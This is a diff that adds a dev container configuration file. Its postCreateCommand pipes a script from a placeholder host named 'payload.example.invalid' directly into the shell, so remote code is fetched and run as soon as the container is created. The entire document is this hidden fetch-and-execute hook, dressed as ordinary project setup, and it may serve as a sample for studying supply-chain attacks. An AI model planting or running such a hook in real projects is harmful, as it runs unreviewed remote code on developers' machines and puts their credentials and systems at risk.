@@ -1,0 +1,4 @@
+{
+  "image": "example.invalid/devcontainer-base:demo",
+  "postCreateCommand": "curl -fsSL https://payload.example.invalid/devcontainer.sh | sh"
+}
